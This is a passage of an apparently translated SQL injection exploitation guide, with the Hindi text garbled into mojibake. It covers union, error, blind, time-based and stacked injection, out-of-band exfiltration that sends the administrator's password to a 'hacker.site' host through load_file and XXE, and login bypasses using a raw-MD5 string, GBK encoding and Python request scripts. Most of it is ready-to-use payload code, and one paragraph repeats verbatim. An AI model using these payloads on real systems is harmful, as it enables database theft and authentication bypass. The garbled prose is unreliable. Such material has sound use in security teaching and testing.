рдЕрдЧрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рд╣рдо рд╕рднреА рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдирд╛рдо, рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЯреЗрдмрд▓ рдирд╛рдо, рдФрд░ рдЯреЗрдмрд▓ рдХреЗ рдХреЙрд▓рдо рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗ:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_рд╣рд░ рдЕрд▓рдЧ рдбреЗрдЯрд╛рдмреЗрд╕ рдкрд░ рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рддрд░реАрдХрд╛ рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╣рдореЗрд╢рд╛ рдПрдХ рд╣реА рдореЗрдердбреЛрд▓реЙрдЬреА рд╣реЛрддреА рд╣реИред_

## рдЫрд┐рдкреА рд╣реБрдИ рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдпрджрд┐ рдЖрдк рдХреНрд╡реЗрд░реА рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЗрдВрдЬреЗрдХреНрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдкрд╛ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдирд┐рдкрдЯ рд░рд╣реЗ рд╣реИрдВред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЖрдк рдЕрдВрдзрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдкрд░ рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВред рдЕрдВрдзрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдмреИрдХрдПрдВрдб рдкрд░ рдЪрд▓ рд░рд╣реА рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред\
рдЖрдк рдЗрд╕реЗ рдЕрдВрдзрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдФрд░ рдЖрдкрдХреЗ рд▓рдХреНрд╖рд┐рдд рдбреАрдмреАрдПрдордПрд╕ рдХреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЯреЗрдмрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЯреЗрдмрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд▓рдХреНрд╖рд┐рдд рдбреАрдмреАрдПрдордПрд╕ рдХреА рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдкрдврд╝реЗрдВред\
рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рд╕рдорд╛рдкреНрдд рдХрд░рддреЗ рд╣реБрдП рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдореЗрдВ рдПрдХ рдпреВрдирд┐рдпрди рдХреНрд╡реЗрд░реА рдЬреЛрдбрд╝рдиреА рд╣реЛрдЧреА рдФрд░ рдирд╡реАрдирддрдо рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рд╢реЛрдз рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдкреВрд░реНрдг рд▓реЗрдЦ: https://medium.com/@Rend\_/healing-blind-injections-df30b9e0e06f

## рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рдЖрдк **рдХреНрд╡реЗрд░реА** рдХреЗ **рдЖрдЙрдЯрдкреБрдЯ** рдХреЛ **рджреЗрдЦ рдирд╣реАрдВ рд╕рдХрддреЗ** рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк **рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рджреЗрдЦ рд╕рдХрддреЗ** рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ** рд╣реИрдВред\
рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЙрддреНрдкрд╛рджрди рдХреА рддрд░рд╣ рдПрдХ рд╣реА рдлрд╝реНрд▓реЛ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рдЖрдк рдбреАрдмреА рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## рдмреНрд▓рд╛рдЗрдВрдб SQLi рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдХреНрд╡реЗрд░реА рдХреЗ рдкрд░рд┐рдгрд╛рдо рдпрд╛ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЛ рдирд╣реАрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдк рдпрд╣ рдЕрдВрддрд░ рд╕рдордЭ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрд╡реЗрд░реА рдПрдХ рд╕рдЪреНрдЪрд╛ рдпрд╛ рдЭреВрдард╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд▓реМрдЯрд╛рддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдкреГрд╖реНрда рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИред\
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдк рдЙрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдПрдХ рдЪрд░ рд╕реЗ рджрдВрдк рдХрд░ рд╕рдХреЗрдВ:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## рддреНрд░реБрдЯрд┐ рдмреНрд▓рд╛рдЗрдВрдб SQLi рдХрд╛ рд╢реЛрд╖рдг

рдпрд╣ **рдкрд╣рд▓реЗ рдЬреИрд╕рд╛ рд╣реА рдорд╛рдорд▓рд╛ рд╣реИ**, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдХреНрд╡реЗрд░реА рд╕реЗ рд╕рдЪ/рдЭреВрдареЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХреЛ рдирд╣реАрдВ рдмрддрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ SQL рдХреНрд╡реЗрд░реА рдореЗрдВ рддреНрд░реБрдЯрд┐ рд╣реЛрдиреЗ рдпрд╛ рди рд╣реЛрдиреЗ (рд╢рд╛рдпрдж HTTP рд╕рд░реНрд╡рд░ рдХреНрд░реИрд╢ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг) рдХреЛ рдЕрдВрддрд░ рдХреЛ рдмрддрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЕрдХреНрд╖рд░ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк SQL рддреНрд░реБрдЯрд┐ рдХреЛ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## рд╕рдордп рдЖрдзрд╛рд░рд┐рдд SQLi рдХрд╛ рд╢реЛрд╖рдг

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреГрд╖реНрда рдХреЗ рд╕рдВрджрд░реНрдн рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдХреНрд╡реЗрд░реА рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдЕрд▓рдЧ рдХрд░рдиреЗ** рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ **рдирд╣реАрдВ рд╣реИ**ред рд▓реЗрдХрд┐рди, рдпрджрд┐ рдЕрдиреБрдорд╛рдирд┐рдд рд╡рд░реНрдг рд╕рд╣реА рд╣реИ, рддреЛ рдЖрдк рдкреГрд╖реНрда рдХреЛ **рд▓реЛрдб рд╣реЛрдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╕рдордп** рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [рдПрдХ SQLi рд╕рдВрдХреЗрдд рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ](./#confirming-with-timing) рдХреЗ рд▓рд┐рдП рджреЗрдЦ рдЪреБрдХреЗ рд╣реИрдВред
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реА

рдЖрдк рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдХреЗ рдмрд╛рдж рдПрдХ рдХреНрд╡реЗрд░реА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рдЖрдЧрд╛рдореА рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ **рдкрд░рд┐рдгрд╛рдо** рдХреЛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП рдпрд╣ рддрдХрдиреАрдХ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рдмреНрд▓рд╛рдЗрдВрдб рд╕реБрд░рдХреНрд╖рд╛ рдЦреЛрдЬреЛрдВ** рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрд╣рд╛рдВ рдЖрдк рдПрдХ рджреВрд╕рд░реА рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DNS рд▓реБрдХрдЕрдк, рд╢рд░реНрддрд╛рдзрд╛рд░рд┐рдд рддреНрд░реБрдЯрд┐ рдпрд╛ рд╕рдордп рджреЗрд░реА рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**Oracle** рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реА рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред **MySQL, Microsoft** рдФрд░ **PostgreSQL** рдЗрдиреНрд╣реЗрдВ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ: `рдпрд╣рд╛рдВ-рдХреНрд╡реЗрд░реА-1; рдпрд╣рд╛рдВ-рдХреНрд╡реЗрд░реА-2`

## рдЖрдЙрдЯ рдСрдлрд╝ рдмреИрдВрдб рдЙрддреНрдкреАрдбрд╝рди

рдпрджрд┐ **рдХреЛрдИ рдЕрдиреНрдп** рдЙрддреНрдкреАрдбрд╝рди рд╡рд┐рдзрд┐ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреА рд╣реИ**, рддреЛ рдЖрдк рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдбреЗрдЯрд╛рдмреЗрд╕ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдмрд╛рд╣рд░реА рд╣реЛрд╕реНрдЯ** рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, DNS рдХреНрд╡реЗрд░реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдЙрдЯ рдСрдлрд╝ рдмреИрдВрдб рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА

рдПрдХреНрд╕рдПрдордПрд▓ рдПрдХреНрд╕рдЯрд░реНрдирд▓ рдПрдВрдЯрд┐рдЯреА (XXE) рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рд╣реИ рдЬреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рд░реЗрдлрд╝рд░реЗрдВрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рдПрдХ рдЖрдХрд╕реНрдорд┐рдХ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА рддрдХрдиреАрдХ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдЪреЛрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдПрдВрдЯрд┐рдЯреА рд░реЗрдлрд╝рд░реЗрдВрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕ рддрд░рд╣, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдЪреЛрд░реА рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рдЖрдХрд╕реНрдорд┐рдХ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдЪреЛрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдПрдВрдЯрд┐рдЯреА рд░реЗрдлрд╝рд░реЗрдВрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕ рддрд░рд╣, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдЪреЛрд░реА рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╢реЛрдзрди

[**sqlmap**](https://github.com/sqlmapproject/sqlmap) рдХреЗ рд╕рд╛рде SQLi рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [SQLMap Cheetsheat](sqlmap/) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

## рддрдХрдиреАрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЬрд╛рдирдХрд╛рд░реА

рд╣рдордиреЗ рдкрд╣рд▓реЗ рд╣реА SQL Injection рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЗ рдкрд░ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИред рдЗрд╕ рдкреБрд╕реНрддрдХ рдореЗрдВ рдбреЗрдЯрд╛рдмреЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХреБрдЫ рдФрд░ рдЯреНрд░рд┐рдХреНрд╕ рджреЗрдЦреЗрдВ:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

рдпрд╛ рдЖрдкрдХреЛ [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) рдореЗрдВ **MySQL, PostgreSQL, Oracle, MSSQL, SQLite рдФрд░ HQL рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╣реБрдд рд╕рд╛рд░реА рдЯреНрд░рд┐рдХреНрд╕ рдорд┐рд▓реЗрдВрдЧреА**ред

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдореНрдореЗрд▓рди рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рд╣рд░ рд╡рд┐рд╖рдп рдореЗрдВ рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рдиреЗ рдХрд╛ рд╕рдордп рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдЗрдкрд╛рд╕

рд▓реЙрдЧрд┐рди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреА рд╕реВрдЪреА:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдЗрдкрд╛рд╕ (Raw MD5)

рдЬрдм рдПрдХ рд░реЙ рдореЗрдВрдбреА5 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкрд╛рд╕рд╡рд░реНрдб рдПрдХ рд╕рд╛рдзрд╛рд░рдг рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╢реНрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рд╣реЗрдХреНрд╕рд╕реНрдЯреНрд░рд┐рдВрдЧ рдирд╣реАрдВред
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЬрд┐рд╕рдореЗрдВ `true` рдХрдерди рдХреЗ рд╕рд╛рде рдПрдХ рдмрдпрд╛рди рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ `' рдпрд╛ 'SOMETHING`
```sql
md5("ffifdyop", true) = 'or'6я┐╜]я┐╜я┐╜!r,я┐╜я┐╜bя┐╜
```
рдЪреБрдиреМрддреА рдХрд╛ рдбреЗрдореЛ [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИ

### рд╣реИрд╢ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдИрдкрд╛рд╕
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**рд╕рд┐рдлрд╛рд░рд┐рд╢рд┐рдд рд╕реВрдЪреА**:

рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдкрдВрдХреНрддрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╣рдореЗрд╢рд╛: _**Pass1234.**_\
_(рдпреЗ рдкреЗрд▓реЛрдб рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдмрдбрд╝реА рд╕реВрдЪреА рдореЗрдВ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдИрдкрд╛рд╕

рдпрджрд┐ ' рдХреЛ рдПрд╕реНрдХреЗрдк рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк %A8%27 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЬрдм ' рдХреЛ рдПрд╕реНрдХреЗрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛: 0xA80x5c0x27 (_тХШ'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
```python
import requests

# Define the target URL
url = "http://example.com/login"

# Define the payload for SQL injection
payload = "' OR '1'='1' -- "

# Send the request with the payload
response = requests.post(url, data={"username": payload, "password": ""})

# Check if the SQL injection was successful
if "Login successful" in response.text:
    print("SQL injection successful!")
else:
    print("SQL injection failed.")
```
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди (рдорд▓реНрдЯреАрдХреЙрдВрдЯреЗрдХреНрд╕реНрдЯ)

Polyglot injection, also known as multicontext injection, is a technique used in SQL injection attacks to exploit vulnerabilities in web applications. In a polyglot injection, the attacker crafts a malicious payload that can be interpreted as valid code in multiple database management systems (DBMS) or programming languages.

The advantage of using a polyglot injection is that it allows the attacker to target multiple types of databases or programming languages with a single payload. This can be useful when the attacker is unsure about the specific DBMS or programming language used by the target application.

To create a polyglot injection, the attacker needs to understand the syntax and behavior of different DBMS or programming languages. By crafting a payload that is valid in multiple contexts, the attacker increases the chances of successfully exploiting the SQL injection vulnerability.

